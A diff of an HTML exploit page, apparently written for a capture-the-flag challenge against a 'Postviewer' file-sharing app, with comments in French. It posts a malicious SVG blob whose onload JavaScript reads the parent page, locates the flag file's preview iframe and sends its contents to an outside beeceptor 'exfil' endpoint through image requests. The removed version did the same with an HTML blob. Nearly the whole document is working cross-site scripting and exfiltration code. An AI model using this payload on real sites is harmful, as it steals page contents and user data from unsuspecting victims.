@@ -1,55 +1,52 @@
 <html><body><script>
-/* ————— 0) ping immédiat ————— */
+/* ping immédiat : la page GitHub est chargée */
 new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=outer_loaded';
 
 (async () => {
-/* ————— 1) blob HTML malveillant ————— */
-const epic = `
-  <script>
-    (async () => {
-      /* ping « start » : le blob s’exécute bien */
-      new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=blob_start';
-      try {
-        const links = [...parent.document.querySelectorAll('a')];
-        new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=links_' + links.length;
 
-        if (!links.length) {
-          new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=no_links';
-          return;
-        }
+  /* === 1. fichier SVG avec payload JS dans onload === */
+  const svg = `
+    <svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"
+         onload="
+           (async ()=>{
+             /* ping : le SVG s’exécute → blob_start */
+             new Image().src='https://webtest.free.beeceptor.com/exfil?f=blob_start';
 
-        /* on tente le dernier lien (le flag est ajouté en dernier) */
-        const a = links[links.length - 1];
+             try{
+               const links=[...parent.document.querySelectorAll('a')];
+               new Image().src='https://webtest.free.beeceptor.com/exfil?f=links_'+links.length;
 
-        if (!a) {
-          new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=not_found';
-          return;
-        }
+               const a=links.find(x=>/flag\\.txt$/.test(x.textContent));
+               if(!a){ new Image().src='https://webtest.free.beeceptor.com/exfil?f=not_found'; return; }
 
-        /* ► méthode 1 : tentative fetch directe */
-        const res = await fetch(a.href.startsWith('#') ? a.href : a.href);
-        const txt = await res.text();
-        new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=flag_' +
-                          encodeURIComponent(txt.slice(0,200)); /* tronqué */
+               /* on déclenche le rendu du fichier pour qu’il soit accessible */
+               parent.location.hash=a.id;
+               await new Promise(r=>setTimeout(r,800));
 
-      } catch (e) {
-        new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=error_' +
-                          encodeURIComponent(e.message);
-      } finally {
-        /* ping « done » quelles que soient les branches */
-        new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=done';
-      }
-    })();
-  <\/script>`;
+               const iframe=parent.document
+                   .querySelector('#previewIframeDiv')
+                   .shadowRoot.querySelector('iframe');
 
-/* ————— 2) on envoie le blob à la page Postviewer ————— */
-const blob = new Blob([epic], { type: 'text/html' });
-window.postMessage({
-  type: 'share',
-  files: [{ blob, name: 'epic.html', cached: false }]
-}, '*');
+               const flag=iframe.contentDocument.body.innerText.trim();
+               new Image().src='https://webtest.free.beeceptor.com/exfil?f='+encodeURIComponent(flag);
 
-/* ping après postMessage pour confirmer l’injection */
-new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=postmessage_sent';
+             }catch(e){
+               new Image().src='https://webtest.free.beeceptor.com/exfil?f=error_'+encodeURIComponent(e.message);
+             }finally{
+               new Image().src='https://webtest.free.beeceptor.com/exfil?f=done';
+             }
+           })()
+         ">
+    </svg>`;
+
+  const blob = new Blob([svg], {type:'image/svg+xml'});
+
+  /* === 2. on l’envoie à Postviewer === */
+  window.postMessage({
+    type:'share',
+    files:[{blob, name:'evil.svg', cached:false}]
+  }, '*');
+
+  new Image().src = 'https://webtest.free.beeceptor.com/exfil?f=postmessage_sent';
 })();
 </script></body></html>
